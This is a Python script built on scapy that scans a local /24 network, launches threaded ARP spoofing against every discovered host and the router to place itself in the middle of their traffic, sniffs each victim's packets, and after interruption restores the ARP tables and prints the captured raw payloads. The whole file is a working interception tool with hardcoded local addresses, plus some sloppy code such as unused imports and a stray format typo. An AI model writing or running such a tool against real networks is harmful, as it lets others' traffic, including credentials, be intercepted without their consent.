import time
from asyncio import timeout
from difflib import restore

import scapy.all as scapy
import threading

from scapy.sendrecv import sendp

IP_RANGE = "192.168.1.1/24"
MY_IP = "192.168.1.126"
MY_MAC = "D4:F3:2D:04:3C:8D"
ROUTER_IP = "192.168.1.1"
ROUTER_MAC = "d4:35:1d:75:e3:01"

msg_dic = {}
lock = threading.Lock()
run = True
def restored(ip,router_ip,mac,router_mac,num):
    if num ==1:
        packet_to_send = scapy.Ether(dst=router_mac, src=mac) / scapy.ARP(op=2, hwsrc=mac, psrc=ip, hwdst=router_mac, pdst=router_ip)
        sendp(packet_to_send)
    else:
        packet_to_send = scapy.Ether(dst=mac, src=router_mac) / scapy.ARP(op=2, hwsrc=router_mac, psrc=router_ip, hwdst=mac,pdst=ip)
        sendp(packet_to_send)
def filter_msg(pck,mac):
    global msg_dic
    with lock:
        if pck[scapy.Ether].src == mac:
            msg_dic[mac].append(pck)
            return True
        return False

def ARP_spoofing(ip,mac):
    global msg_dic
    global run
    if ip == ROUTER_IP or ip == MY_IP:
        return

    print(f"start spoofing ip:{ip},mac:{mac}")

    while run:
        packet_to_cp = scapy.Ether(dst=mac, src=MY_MAC) / scapy.ARP(op=2, hwsrc=MY_MAC, psrc=ROUTER_IP, hwdst=mac, pdst=ip)
        packet_to_router = scapy.Ether(dst = ROUTER_MAC,src = MY_MAC) / scapy.ARP(op = 2,hwsrc = MY_MAC,psrc = ip,hwdst = ROUTER_MAC,pdst = ROUTER_IP)
        scapy.sendp(packet_to_cp,verbose = False)
        scapy.sendp(packet_to_router,verbose = False)

        time.sleep(2)


def sniff(ip,mac):
    global run
    while run:
        scapy.sniff(lfilter=lambda pkt: filter_msg(pkt, mac), prn=lambda pkt: filter_msg(pkt, mac), timeout=5)


def scan(ip_range):

    print(f"Scanning IP range:{ip_range}")
    arp_request = scapy.ARP(pdst = ip_range)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    packet = broadcast/arp_request

    print("Sending ARP request...")
    answered_list = scapy.srp(packet,timeout = 5,verbose = True)[0]

    if not answered_list:
        print("No response received")
    else:
        print("Responses received")

    devices = []
    for element in answered_list:
        device = ({"ip":element[1].psrc,"mac":element[1].hwsrc})
        devices.append(device)
        print(f"Device found: IP = {device['ip']}, MAC = {device['mac']}")

    return devices

def display_devices(devices):
    if devices:
        print("\nIP\t\t\tMAC Address")
        print("-----------------------------------------")
        for device in devices:
            print(f"{device['ip']}\t\t{device['mac']}")
    else:
        print("No devices found.")

def main():
    global msg_dic
    global run
    devices = scan(IP_RANGE)
    display_devices(devices)

    threads = []
    for device in devices:
        msg_dic[device["mac"]] = []
    try:
        for device in devices:
            t_spoof = threading.Thread(target = ARP_spoofing,args = (device["ip"],device["mac"]),daemon = True)
            threads.append(t_spoof)
            t_spoof.start()
            t_sniff = threading.Thread(target = sniff,args = (device["ip"],device["mac"]),daemon=True)
            threads.append(t_sniff)
            t_sniff.start()

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        run = False
        print("\n[*] stopping the attack... Restoring Network")

        for device in devices:
            restored(device["ip"],ROUTER_IP,device["mac"],ROUTER_MAC,1)
            restored(ROUTER_IP,device["ip"],ROUTER_MAC,device["mac"],2)

            for mac,packets in msg_dic.items():
                print(f"f\n[*]Device Mac:{mac}")
                print(f"[*] Total packets captured:{len(packets)}")
                for pkt in packets:
                    if pkt.haslayer(scapy.Raw):
                        print(f"Data:{pkt[scapy.Raw].load}")

        print("\n[*] Cleanup finished. Exiting.")


if __name__ == "__main__":
    main()



